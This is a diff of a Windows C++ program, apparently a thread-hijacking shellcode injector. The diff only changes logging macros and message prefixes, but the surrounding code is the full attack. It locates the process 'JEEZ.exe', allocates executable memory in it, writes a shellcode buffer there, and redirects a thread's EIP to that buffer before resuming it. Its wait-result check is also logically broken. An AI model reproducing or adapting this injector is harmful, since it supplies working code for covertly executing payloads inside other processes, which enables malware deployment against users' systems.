@@ -4,23 +4,11 @@
 #include <iomanip>
 #include <Shlwapi.h>
 #include <thread>
+#include <stdio.h>
 #pragma comment( lib, "shlwapi.lib")
 
-
-template <typename ... T>
-__forceinline void print_bad(const char* format, T const& ... args)
-{
-    printf("[!] ");
-    printf(format, args ...);
-
-}
-
-template <typename ... T>
-__forceinline void print_good(const char* format, T const& ... args)
-{
-    printf("[+] ");
-    printf(format, args ...);
-}
+#define print_bad(format, ...) fprintf (stderr, format, __VA_ARGS__)
+#define print_good(format, ...) fprintf (stderr, format, __VA_ARGS__)
 
 DWORD GetPID(const char* pn)
 {
@@ -41,7 +29,7 @@ DWORD GetPID(const char* pn)
                 if (!_stricmp(pE.szExeFile, pn))
                 {
                     procId = pE.th32ProcessID;
-                    print_good("Process %s found : 0x%lX\n", pE.szExeFile, pE.th32ProcessID);
+                    print_good("[+] Process %s found : 0x%lX\n", pE.szExeFile, pE.th32ProcessID);
                     break;
                 }
             } while (Process32Next(hSnap, &pE));
@@ -69,7 +57,7 @@ DWORD EnThread(DWORD procID)
                 if (procID == pE.th32OwnerProcessID)
                 {
                     ThID = pE.th32ThreadID;
-                    print_good("Thread found : 0x%lX\n", pE.th32OwnerProcessID);
+                    print_good("[+] Thread found : 0x%lX\n", pE.th32OwnerProcessID);
                     break;
                 }
             } while (Thread32Next(hSnap, &pE));
@@ -78,7 +66,6 @@ DWORD EnThread(DWORD procID)
     CloseHandle(hSnap);
     return(ThID);
 }
-
 
 int main(void)
 {
@@ -104,11 +91,11 @@ int main(void)
     HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("JEEZ.exe"));
     if (proc)
     {
-        print_good("Process Opened Successfully :0x%lX\n", GetLastError());
+        print_good("[+] Process Opened Successfully :0x%lX\n", GetLastError());
         void* base = VirtualAllocEx(proc, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (base)
         {
-            print_good("shellcode Base address : 0x%08x\n", base);
+            print_good("[+] shellcode Base address : 0x%08x\n", base);
             if (WriteProcessMemory(proc, base, ExecBuffer, sizeof(ExecBuffer), 0))
             {
                 if (HANDLE htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr)))
@@ -119,18 +106,18 @@ int main(void)
                         context.ContextFlags = CONTEXT_FULL;
                         if (GetThreadContext(htd, &context))
                         {
-                            print_good("EIP hold: 0x%08x\n", context.Eip);
+                            print_good("[+] EIP hold: 0x%08x\n", context.Eip);
                             context.Eip = (DWORD)base;
                             if (SetThreadContext(htd, &context))
                             {
-                                print_good("EIP Hijacked succesfully : 0x%08x\n", context.Eip);
+                                print_good("[+] EIP Hijacked succesfully : 0x%08x\n", context.Eip);
                                 if (ResumeThread(htd) != (DWORD)-0b01)
                                 {
-                                    print_good("thread Resumed succesfully : 0x%08x\n", context.Eip);
+                                    print_good("[+] thread Resumed succesfully : 0x%08x\n", context.Eip);
                                     if ((WaitForSingleObject(htd, INFINITE) != 0x00000080L) || (0x00000000L) || (0x00000102L) || ((DWORD)0xFFFFFFFF))
-                                        print_good("Thread finished Succesfully 0x%lX\n", htd);
+                                        print_good("[+] Thread finished Succesfully 0x%lX\n", htd);
                                     else
-                                        print_bad("WaitForSingleObject error 0x%lX\n", GetLastError());
+                                        print_bad("[!] WaitForSingleObject error 0x%lX\n", GetLastError());
                                 }
                             }
                         }
@@ -140,7 +127,7 @@ int main(void)
         }
     }
     else
-        print_bad("Process Not found (0x%lX)\n", GetLastError());
+        print_bad("[!] Process Not found (0x%lX)\n", GetLastError());
 
     __asm
     {
